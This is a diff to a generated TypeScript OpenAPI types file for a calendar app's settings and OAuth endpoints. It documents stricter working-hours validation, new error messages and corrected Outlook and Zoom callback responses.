          *     `additionalProperties` stays `true`: the member set of a block varies by type (`text`, `elements`, `emoji`), the Go type is a bare map, and pinning the members would be a stricter claim than the code supports. The `type` enum is the part that was actually determinable, and it is the part a client switches on. PAC-24 changes none of this behaviour - only what the contract says about it.
@@ -4390,17 +4520,17 @@ export interface components {
          *      */
         WorkingHoursSchedule: {
             /**
-             * @description Compared case-insensitively after trimming during validation (`backend/api/handlers_settings.go:128`), but the persisted value is whatever was sent.
+             * @description Compared EXACTLY by the handler (revision 3): `"BY_DAY"` and `" all_days"` are a 400. Before PAC-24 the validator lower-cased and trimmed, then persisted whatever was sent. Migration 024 turns a stored mode that equals `by_day` ignoring case (and NOT trimmed: `" by_day"` never matched) into `by_day`, and any other non-empty value into `all_days` - exactly how `WorkWindow` treated them (it only special-cases `by_day`, case-insensitively). It also clears an enabled entry that would fail validation in the half the stored mode ignored before the upgrade (`days` under `all_days`, `default` under `by_day`), which `WorkWindow` never read. It does not touch the half in use, nor a `default` derived on read for a mode-`""` row: a write of `workingHours` must make those valid (see `SettingsUpdate`).
              *     `''` is in the enum because the server accepts it (`:129`, `mode != "" && mode != "all_days" && mode != "by_day"`) and because the contract must describe what is, not what should be (factory §7). Revision 1 of this contract omitted `''` while the description two lines below said it was accepted - a schema disagreeing with its own prose. It is accepted on write ONLY when `days` is empty; otherwise it is the existing 400 `workingHours.mode is required when day-specific hours are provided` (`:132-134`). That conditional is cross-property and OpenAPI cannot express it, so it stays a documented 400 rather than becoming a schema narrowing - narrowing here would be a NEW rejection, and spec §6 requires both tests in `backend/api/handlers_settings_schedule_test.go` to keep passing unchanged.
              *     A GET never returns `''`, because normalisation rewrites it.
              *
              * @enum {string}
              */
             mode: "" | "all_days" | "by_day";
-            /** @description Only validated when `mode == "all_days"` and at least one of enabled/start/end is set. Ignored by WorkWindow() in by_day mode.
+            /** @description Validated whenever at least one of enabled/start/end is set, in either mode (revision 4). Ignored by WorkWindow() in by_day mode.
              *      */
             default: components["schemas"]["DaySchedule"];
-            /** @description Keys are lowercase English weekday names, and PAC-24 makes that a schema constraint rather than a warning. `validateSchedulePreferences` lowercases before checking (`backend/api/handlers_settings.go:145`, `validScheduleWeekdays[strings.ToLower(day)]`), so `"Monday"` passes validation and is stored - but `WorkWindow` looks the day up as `strings.ToLower(day.Weekday().String())` (`backend/storage/settings.go:117`), so the entry can never match and the user's Monday hours are silently inert forever. Under the whole-object replace this is worse than it was: the write that installs the dead key also deletes the live key it replaced. `propertyNames` makes the dead key a 400 instead of a document that says so. In `by_day` mode a missing weekday means "not working".
+            /** @description Keys are lowercase English weekday names, and PAC-24 makes that a constraint THE HANDLER ENFORCES (revision 3): `propertyNames` below documents it, but no generator carries `propertyNames` into a validator, so the server's exact-match check is the enforcement point (contract challenge r2, finding 4). Migration 024 removes stored keys that are not exactly one of the seven names - they never matched `WorkWindow`'s lookup, so removing them changes no behaviour; it also removes entries whose `start`/`end` are neither empty nor a clock. Keys and entries are checked WHATEVER THE MODE (revision 4): a `days` map stored under `all_days` is still returned by GET. Before PAC-24 the validator lower-cased keys and only looked at `days` in `by_day` mode, so `"Monday"` was stored and never matched. In `by_day` mode a missing weekday means "not working".
              *      */
             days: {
                 [key: string]: components["schemas"]["DaySchedule"];
@@ -4495,8 +4625,8 @@ export interface components {
         /** @description Malformed JSON, or a value the server refuses. JSON error shape (writeError). A body property set to `null` is refused here: no property of SettingsUpdate is nullable (spec AC-8).
          *     Messages that already exist: `invalid JSON: <err>`; `<field> must be in HH:MM format` (workStart/workEnd/lunchStart/lunchEnd); `focusMinBlockMinutes must be positive`; `focusMaxBlockMinutes must be positive`; `focusDailyTargetMinutes must be positive`; `outOfHoursMeetingsPerWeek must be zero or positive`; `bufferBeforeMinutes must be positive`; `bufferAfterMinutes must be positive`; `autoScheduleCron must be a 5-part cron expression`; `autoScheduleCron is invalid: <err>`; `llmProvider must be one of: openai, anthropic, ollama, bedrock, azure_openai, vertex`; `workingHours.mode must be all_days or by_day`; `workingHours.mode is required when day-specific hours are provided`; `workingHours.days.<day> is not a valid weekday`; `lunchBreaks.<day> is not a valid weekday`; `<field> requires start and end when enabled`; `<field> start and end must be in HH:MM format`; `<field> end must be after start`.
          *     Messages PAC-24 adds, closing API-081 and API-082 - each of these is a value the server accepted before and then failed on, silently or as a 500 (spec AC-17): `workEnd must be after workStart`; `lunchEnd must be after lunchStart`; `focusMinBlockMinutes must not exceed focusMaxBlockMinutes`; `bufferMinMeetingMinutes must be zero or positive`; `timezone is not a known IANA location`; `recapSendTo must be dm or channel` (previously reached the DB CHECK and surfaced as a 500 - API-081); `recapSendTime must be in HH:MM format` (previously reached the Postgres TIME cast and surfaced as a 500); `calendarProvider must be one of: google, outlook, webcal` (resolves U-18); `conferencingProvider must be one of: meet, zoom, teams`.
-         *     Messages revision 2 of this contract adds, each with its reason: `recapSendTime must be in HH:MM format` now also covers `""`. The write path previously substituted `08:00` for an empty value (`recapSendTimeOrDefault`, `backend/storage/settings.go:356-361`); under the merge rule a present property must be stored exactly as given, so a silent substitution is a contract violation and the empty value is refused instead. See `SettingsFields.recapSendTime`; this is the one clock property for which `""` is NOT a value, and it needs a narrow amendment to spec AC-7. `workingHours.days must contain at least one weekday when mode is by_day` - a `by_day` document with an empty `days` map is the only remaining stored state that makes the consumer delete the working-hours section with no error (`smart-calendar-flow/src/api/client.ts:505-517,543`); the `all_days` equivalent is already normalised away on read (`backend/storage/settings.go:95-99`). Serves spec AC-20.
-         *     Two messages in the list above become UNREACHABLE via the HTTP boundary and remain only as defence in depth, because `propertyNames` now rejects the request at schema validation: `workingHours.days.<day> is not a valid weekday` and `lunchBreaks.<day> is not a valid weekday`. The handler checks stay - they are what `handlers_settings_schedule_test.go:41-49` asserts, and spec §6 requires that test to keep passing unchanged.
+         *     Messages revision 2 of this contract adds, each with its reason: `recapSendTime must be in HH:MM format` now also covers `""`. The write path previously substituted `08:00` for an empty value (`recapSendTimeOrDefault`, `backend/storage/settings.go:356-361`); under the merge rule a present property must be stored exactly as given, so a silent substitution is a contract violation and the empty value is refused instead. See `Settings.recapSendTime`; this is the one clock property for which `""` is NOT a value, and it needs a narrow amendment to spec AC-7. `workingHours.days must contain at least one weekday when mode is by_day` - a `by_day` document with an empty `days` map is the only remaining stored state that makes the consumer delete the working-hours section with no error (`smart-calendar-flow/src/api/client.ts:505-517,543`); the `all_days` equivalent is already normalised away on read (`backend/storage/settings.go:95-99`). Serves spec AC-20.
+         *     `workingHours.days.<day> is not a valid weekday` and `lunchBreaks.<day> is not a valid weekday` are how a weekday key that is not exactly one of the seven lowercase names is refused: generators drop `propertyNames`, so the handler is the only enforcement point (revision 3/4).
          *     `""` is NOT in this catalogue for `workStart`, `workEnd`, `lunchStart` or `lunchEnd`. It is a valid value for all four, on read and on write (spec AC-7); the handler already skips the format check for it (`backend/api/handlers_settings.go:75`).
          *      */
         SettingsValidationError: {
@@ -5285,15 +5415,13 @@ export interface operations {
         };
         requestBody?: never;
         responses: {
-            /** @description Redirect to `<FRONTEND_URL>/auth/callback?provider=outlook`.
-             *     The `auth_token` cookie is only set when the Graph profile fetch AND
-             *     the user upsert both succeed — the redirect is identical either way,
-             *     so a caller cannot tell from the response whether it is logged in.
+            /** @description Redirect to `<FRONTEND_URL>/auth/callback?provider=outlook`, with the
+             *     `auth_token` cookie set. Every failure is a non-302 response below.
              *      */
             302: {
                 headers: {
                     Location?: string;
-                    /** @description auth_token JWT — conditional, see description. */
+                    /** @description auth_token JWT for the upserted user. */
                     "Set-Cookie"?: string;
                     [name: string]: unknown;
                 };
@@ -5308,8 +5436,19 @@ export interface operations {
                     "text/plain": components["schemas"]["PlainTextError"];
                 };
             };
-            /** @description Token exchange, settings read or token save failed (text/plain). */
+            /** @description Token exchange, user upsert (`save user failed`) or token save (`save token failed: <err>`) failed (text/plain).
+             *      */
             500: {
+                headers: {
+                    [name: string]: unknown;
+                };
+                content: {
+                    "text/plain": components["schemas"]["PlainTextError"];
+                };
+            };
+            /** @description The Graph profile could not be read, or carried no email (`could not read the Microsoft account`, text/plain). Added by PAC-24.
+             *      */
+            502: {
                 headers: {
                     [name: string]: unknown;
                 };
@@ -5431,6 +5570,7 @@ export interface operations {
                 };
                 content?: never;
             };
+            401: components["responses"]["BookingUnauthorized"];
             /** @description ZOOM_CLIENT_ID is unset. Body: {"error":"Zoom OAuth not configured"} */
             503: {
                 headers: {
@@ -5476,6 +5616,7 @@ export interface operations {
                     "text/plain": "invalid state\n";
                 };
             };
+            401: components["responses"]["BookingUnauthorized"];
             /** @description Token exchange or token persistence failed. */
             500: {
                 headers: {
@@ -6896,7 +7037,7 @@ export interface operations {
             path?: never;
             cookie?: never;
         };
-        requestBody?: {
+        requestBody: {
             content: {
                 "application/json": components["schemas"]["LLMTestRequest"];
             };
@@ -9672,6 +9813,3 @@ export interface operations {
         };
     };
 }
-type WithRequired<T, K extends keyof T> = T & {
-    [P in K]-?: T[P];
-};
